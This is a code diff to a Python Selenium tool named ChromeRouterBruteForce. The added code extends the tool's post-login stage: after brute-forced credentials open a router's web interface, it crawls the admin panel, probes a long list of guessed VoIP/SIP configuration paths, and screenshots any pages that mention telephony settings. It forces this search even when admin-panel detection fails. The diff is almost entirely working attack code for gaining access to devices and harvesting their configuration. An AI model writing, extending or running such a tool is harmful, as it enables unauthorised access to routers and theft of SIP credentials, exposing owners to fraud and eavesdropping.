@@ -611,34 +611,84 @@ class ChromeRouterBruteForce:
             print(f"{Colors.BLUE}[*] Extracting all links from admin panel...{Colors.END}")
             
             try:
-                # Get all links on the current admin panel page
-                links = self.driver.find_elements(By.TAG_NAME, "a")
+                # Get all links on the current admin panel page - try multiple methods
+                links = []
+                
+                # Method 1: Standard links
+                try:
+                    links.extend(self.driver.find_elements(By.TAG_NAME, "a"))
+                except:
+                    pass
+                
+                # Method 2: Clickable elements
+                try:
+                    clickable_elements = self.driver.find_elements(By.CSS_SELECTOR, "[onclick], [href], button, input[type='button'], input[type='submit']")
+                    links.extend(clickable_elements)
+                except:
+                    pass
+                
+                # Method 3: All elements with href
+                try:
+                    href_elements = self.driver.find_elements(By.CSS_SELECTOR, "[href]")
+                    links.extend(href_elements)
+                except:
+                    pass
+                
+                # Method 4: All clickable divs/spans (common in router interfaces)
+                try:
+                    clickable_divs = self.driver.find_elements(By.CSS_SELECTOR, "div[onclick], span[onclick], td[onclick], li[onclick]")
+                    links.extend(clickable_divs)
+                except:
+                    pass
+                
+                # Remove duplicates
+                unique_links = []
+                seen_hrefs = set()
+                for link in links:
+                    try:
+                        href = link.get_attribute("href") or link.get_attribute("onclick") or ""
+                        if href and href not in seen_hrefs:
+                            unique_links.append(link)
+                            seen_hrefs.add(href)
+                    except:
+                        pass
+                
+                links = unique_links
                 
                 voip_links = []
                 voip_keywords = [
                     "voip", "sip", "voice", "telephony", "phone", "pbx", "trunk",
-                    "call", "dial", "extension", "line", "gateway", "proxy", "fax"
+                    "call", "dial", "extension", "line", "gateway", "proxy", "fax",
+                    "phone system", "call routing", "sip server", "voip server"
                 ]
                 
-                print(f"{Colors.BLUE}[*] Found {len(links)} total links on admin panel{Colors.END}")
+                print(f"{Colors.BLUE}[*] Found {len(links)} total clickable elements on admin panel{Colors.END}")
+                
+                # Debug: Print some link examples
+                for i, link in enumerate(links[:10]):  # Show first 10 links
+                    try:
+                        text = link.text.strip()
+                        href = link.get_attribute("href") or link.get_attribute("onclick") or ""
+                        print(f"{Colors.BLUE}[*] Link {i+1}: '{text[:50]}' -> {href[:100]}{Colors.END}")
+                    except:
+                        pass
                 
                 # Filter links that contain VoIP/SIP keywords
                 for link in links:
                     try:
                         link_text = link.text.lower().strip()
-                        link_href = link.get_attribute("href")
+                        link_href = link.get_attribute("href") or link.get_attribute("onclick") or ""
                         
-                        if link_href and link_text:
-                            # Check if link text contains VoIP/SIP keywords
-                            if any(keyword in link_text for keyword in voip_keywords):
-                                voip_links.append({
-                                    'text': link_text,
-                                    'href': link_href,
-                                    'element': link
-                                })
-                                print(f"{Colors.GREEN}[+] Found VoIP/SIP link: '{link_text}' -> {link_href}{Colors.END}")
+                        # Check if link text contains VoIP/SIP keywords
+                        if link_text and any(keyword in link_text for keyword in voip_keywords):
+                            voip_links.append({
+                                'text': link_text,
+                                'href': link_href,
+                                'element': link
+                            })
+                            print(f"{Colors.GREEN}[+] Found VoIP/SIP link: '{link_text}' -> {link_href}{Colors.END}")
                         
-                        # Also check href for VoIP/SIP keywords
+                        # Also check href/onclick for VoIP/SIP keywords
                         elif link_href and any(keyword in link_href.lower() for keyword in voip_keywords):
                             voip_links.append({
                                 'text': f"Link: {link_href}",
@@ -646,6 +696,16 @@ class ChromeRouterBruteForce:
                                 'element': link
                             })
                             print(f"{Colors.GREEN}[+] Found VoIP/SIP link in URL: {link_href}{Colors.END}")
+                        
+                        # Check for common router navigation patterns
+                        elif link_text and any(nav in link_text for nav in ["advanced", "network", "system", "config", "settings", "admin"]):
+                            # Check if this might lead to VoIP pages
+                            voip_links.append({
+                                'text': link_text,
+                                'href': link_href,
+                                'element': link
+                            })
+                            print(f"{Colors.YELLOW}[*] Found potential navigation link: '{link_text}' -> {link_href}{Colors.END}")
                             
                     except Exception as e:
                         continue
@@ -740,10 +800,21 @@ class ChromeRouterBruteForce:
                 print(f"{Colors.BLUE}[*] Trying common VoIP/SIP paths as fallback...{Colors.END}")
                 
                 voip_paths = [
-                    "/voip", "/sip", "/voice", "/telephony", "/phone",
-                    "/advanced/voip", "/advanced/sip", "/network/voip", "/network/sip",
-                    "/admin/voip", "/admin/sip", "/config/voip", "/config/sip",
-                    "/settings/voip", "/settings/sip", "/system/voip", "/system/sip"
+                    "/voip", "/sip", "/voice", "/telephony", "/phone", "/fax",
+                    "/advanced/voip", "/advanced/sip", "/advanced/voice", "/advanced/telephony",
+                    "/network/voip", "/network/sip", "/network/voice", "/network/telephony",
+                    "/admin/voip", "/admin/sip", "/admin/voice", "/admin/telephony",
+                    "/config/voip", "/config/sip", "/config/voice", "/config/telephony",
+                    "/settings/voip", "/settings/sip", "/settings/voice", "/settings/telephony",
+                    "/system/voip", "/system/sip", "/system/voice", "/system/telephony",
+                    "/voip.html", "/sip.html", "/voice.html", "/telephony.html", "/phone.html",
+                    "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html",
+                    "/voip_configuration.html", "/sip_configuration.html", "/voice_config.html",
+                    "/phone_config.html", "/telephony_config.html", "/pbx.html", "/trunk.html",
+                    "/call_routing.html", "/extension.html", "/gateway.html", "/proxy.html",
+                    "/call_forwarding.html", "/voicemail.html", "/conference.html", "/hold.html",
+                    "/dial_plan.html", "/codec.html", "/dtmf.html", "/ringtone.html",
+                    "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
                 ]
                 
                 for path in voip_paths:
@@ -780,6 +851,70 @@ class ChromeRouterBruteForce:
                     except Exception as e:
                         continue
             
+            # Method 3: Search current admin panel page for VoIP/SIP content
+            if not screenshots_taken:
+                print(f"{Colors.BLUE}[*] Searching current admin panel for VoIP/SIP content...{Colors.END}")
+                
+                try:
+                    # Go back to admin panel
+                    self.driver.get(base_url)
+                    time.sleep(3)
+                    
+                    # Get page content
+                    page_source = self.driver.page_source.lower()
+                    title = self.driver.title.lower()
+                    
+                    # Enhanced VoIP/SIP indicators
+                    voip_indicators = [
+                        'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
+                        'call', 'dial', 'extension', 'line', 'gateway', 'proxy', 'fax',
+                        'sip server', 'voip server', 'phone system', 'call routing',
+                        'sip proxy', 'sip registrar', 'sip trunk', 'voip gateway',
+                        'call forwarding', 'call transfer', 'conference', 'hold',
+                        'ringtone', 'voicemail', 'dial plan', 'codec', 'dtmf',
+                        'call waiting', 'caller id', 'call blocking', 'call log'
+                    ]
+                    
+                    voip_count = sum(1 for indicator in voip_indicators if indicator in page_source)
+                    title_voip_count = sum(1 for indicator in voip_indicators if indicator in title)
+                    
+                    total_voip_indicators = voip_count + title_voip_count
+                    
+                    print(f"{Colors.BLUE}[*] VoIP indicators in admin panel: {voip_count} in content, {title_voip_count} in title{Colors.END}")
+                    
+                    if total_voip_indicators >= 1:  # Even 1 indicator might be worth checking
+                        print(f"{Colors.GREEN}[+] Found VoIP/SIP content in admin panel!{Colors.END}")
+                        print(f"{Colors.GREEN}[+] Total VoIP indicators: {total_voip_indicators}{Colors.END}")
+                        
+                        # Take screenshot of admin panel with VoIP content
+                        screenshot_path = self.take_screenshot("voip_sip_admin_panel", base_url)
+                        if screenshot_path:
+                            screenshots_taken.append(screenshot_path)
+                        
+                        # Look for VoIP-related forms or tables
+                        try:
+                            voip_elements = [
+                                "input[name*='voip']", "input[name*='sip']", "input[name*='phone']", "input[name*='voice']",
+                                "select[name*='voip']", "select[name*='sip']", "select[name*='phone']", "select[name*='voice']",
+                                "textarea[name*='voip']", "textarea[name*='sip']", "textarea[name*='phone']", "textarea[name*='voice']",
+                                "table[id*='voip']", "table[class*='voip']", "table[id*='sip']", "table[class*='sip']",
+                                "form[id*='voip']", "form[name*='voip']", "form[class*='voip']",
+                                "form[id*='sip']", "form[name*='sip']", "form[class*='sip']",
+                                "div[id*='voip']", "div[class*='voip']", "div[id*='sip']", "div[class*='sip']"
+                            ]
+                            
+                            for selector in voip_elements:
+                                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
+                                if elements:
+                                    print(f"{Colors.GREEN}[+] Found VoIP/SIP element: {selector} ({len(elements)} elements){Colors.END}")
+                                    break
+                                    
+                        except Exception as e:
+                            pass
+                    
+                except Exception as e:
+                    print(f"{Colors.YELLOW}[!] Error searching admin panel content: {e}{Colors.END}")
+            
             if screenshots_taken:
                 print(f"{Colors.GREEN}[+] VoIP/SIP screenshots taken: {len(screenshots_taken)}{Colors.END}")
                 return screenshots_taken
@@ -801,12 +936,111 @@ class ChromeRouterBruteForce:
             parsed_url = urlparse(login_url)
             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
             
-            # Search for VoIP/SIP pages
-            voip_screenshots = self.find_voip_sip_pages(base_url)
+            # Always try VoIP search regardless of admin panel detection
+            print(f"{Colors.BLUE}[*] Starting comprehensive VoIP/SIP search...{Colors.END}")
             
-            if voip_screenshots:
-                print(f"{Colors.GREEN}[+] Found {len(voip_screenshots)} VoIP/SIP configuration pages{Colors.END}")
-                return voip_screenshots
+            screenshots_taken = []
+            
+            # Method 1: Try direct VoIP/SIP paths immediately
+            print(f"{Colors.BLUE}[*] Method 1: Testing direct VoIP/SIP paths...{Colors.END}")
+            
+            voip_paths = [
+                "/voip", "/sip", "/voice", "/telephony", "/phone", "/fax",
+                "/advanced/voip", "/advanced/sip", "/advanced/voice", "/advanced/telephony",
+                "/network/voip", "/network/sip", "/network/voice", "/network/telephony",
+                "/admin/voip", "/admin/sip", "/admin/voice", "/admin/telephony",
+                "/config/voip", "/config/sip", "/config/voice", "/config/telephony",
+                "/settings/voip", "/settings/sip", "/settings/voice", "/settings/telephony",
+                "/system/voip", "/system/sip", "/system/voice", "/system/telephony",
+                "/voip.html", "/sip.html", "/voice.html", "/telephony.html", "/phone.html",
+                "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html",
+                "/voip_configuration.html", "/sip_configuration.html", "/voice_config.html",
+                "/phone_config.html", "/telephony_config.html", "/pbx.html", "/trunk.html",
+                "/call_routing.html", "/extension.html", "/gateway.html", "/proxy.html",
+                "/call_forwarding.html", "/voicemail.html", "/conference.html", "/hold.html",
+                "/dial_plan.html", "/codec.html", "/dtmf.html", "/ringtone.html",
+                "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
+            ]
+            
+            for i, path in enumerate(voip_paths):
+                try:
+                    voip_url = f"{base_url.rstrip('/')}{path}"
+                    print(f"{Colors.BLUE}[*] Testing VoIP path {i+1}/{len(voip_paths)}: {voip_url}{Colors.END}")
+                    
+                    self.driver.get(voip_url)
+                    time.sleep(2)  # Shorter wait for faster testing
+                    
+                    # Check if page loaded successfully and contains VoIP/SIP content
+                    page_source = self.driver.page_source.lower()
+                    title = self.driver.title.lower()
+                    
+                    # Enhanced VoIP/SIP indicators
+                    voip_indicators = [
+                        'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
+                        'call', 'dial', 'extension', 'line', 'gateway', 'proxy', 'fax',
+                        'sip server', 'voip server', 'phone system', 'call routing',
+                        'sip proxy', 'sip registrar', 'sip trunk', 'voip gateway',
+                        'call forwarding', 'call transfer', 'conference', 'hold',
+                        'ringtone', 'voicemail', 'dial plan', 'codec', 'dtmf',
+                        'call waiting', 'caller id', 'call blocking', 'call log'
+                    ]
+                    
+                    voip_count = sum(1 for indicator in voip_indicators if indicator in page_source)
+                    title_voip_count = sum(1 for indicator in voip_indicators if indicator in title)
+                    total_voip_indicators = voip_count + title_voip_count
+                    
+                    # More lenient criteria - even 1 indicator might be worth checking
+                    if total_voip_indicators >= 1:
+                        print(f"{Colors.GREEN}[+] VoIP/SIP page found: {voip_url}{Colors.END}")
+                        print(f"{Colors.GREEN}[+] VoIP indicators: {total_voip_indicators} (content: {voip_count}, title: {title_voip_count}){Colors.END}")
+                        print(f"{Colors.GREEN}[+] Page title: {self.driver.title}{Colors.END}")
+                        
+                        # Take screenshot
+                        screenshot_path = self.take_screenshot(f"voip_sip_config_{path.replace('/', '_').replace('.html', '')}", voip_url)
+                        if screenshot_path:
+                            screenshots_taken.append(screenshot_path)
+                        
+                        # Don't break - continue to find more pages
+                        continue
+                    
+                    # Check for HTTP status codes that might indicate VoIP pages
+                    if "404" not in page_source and "not found" not in page_source:
+                        # Even if no VoIP indicators, check if it's a configuration page
+                        config_indicators = ['configuration', 'settings', 'setup', 'config', 'admin']
+                        config_count = sum(1 for indicator in config_indicators if indicator in page_source or indicator in title)
+                        
+                        if config_count >= 2 and total_voip_indicators >= 0:
+                            print(f"{Colors.YELLOW}[*] Potential configuration page: {voip_url}{Colors.END}")
+                            print(f"{Colors.YELLOW}[*] Config indicators: {config_count}{Colors.END}")
+                            
+                            # Take screenshot for manual review
+                            screenshot_path = self.take_screenshot(f"potential_config_{path.replace('/', '_').replace('.html', '')}", voip_url)
+                            if screenshot_path:
+                                screenshots_taken.append(screenshot_path)
+                        
+                except Exception as e:
+                    print(f"{Colors.YELLOW}[!] Error testing path {voip_url}: {e}{Colors.END}")
+                    continue
+            
+            # Method 2: Try to navigate back to admin panel and search for links
+            if not screenshots_taken:
+                print(f"{Colors.BLUE}[*] Method 2: Searching admin panel for VoIP/SIP links...{Colors.END}")
+                
+                try:
+                    # Go back to admin panel
+                    self.driver.get(base_url)
+                    time.sleep(3)
+                    
+                    # Try the enhanced link search
+                    voip_screenshots = self.find_voip_sip_pages(base_url)
+                    screenshots_taken.extend(voip_screenshots)
+                    
+                except Exception as e:
+                    print(f"{Colors.YELLOW}[!] Error in Method 2: {e}{Colors.END}")
+            
+            if screenshots_taken:
+                print(f"{Colors.GREEN}[+] VoIP/SIP screenshots taken: {len(screenshots_taken)}{Colors.END}")
+                return screenshots_taken
             else:
                 print(f"{Colors.YELLOW}[!] No VoIP/SIP configuration pages found{Colors.END}")
                 return []
@@ -1096,7 +1330,17 @@ class ChromeRouterBruteForce:
                     return True, screenshot_path
                 else:
                     print(f"{Colors.YELLOW}[!] Basic Auth worked but not admin panel: {reason}{Colors.END}")
-                    return False, f"HTTP Basic Auth worked but not admin panel: {reason}"
+                    
+                    # Force VoIP search even if admin panel detection failed
+                    print(f"{Colors.BLUE}[*] Attempting VoIP/SIP search anyway...{Colors.END}")
+                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    
+                    if voip_screenshots:
+                        print(f"{Colors.GREEN}[+] Found VoIP/SIP pages despite admin panel detection failure!{Colors.END}")
+                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                        return True, screenshot_path
+                    else:
+                        return False, f"HTTP Basic Auth worked but not admin panel: {reason}"
             else:
                 print(f"{Colors.YELLOW}[!] Basic Auth failed - still on error page{Colors.END}")
                 return False, "HTTP Basic Auth failed - error page"
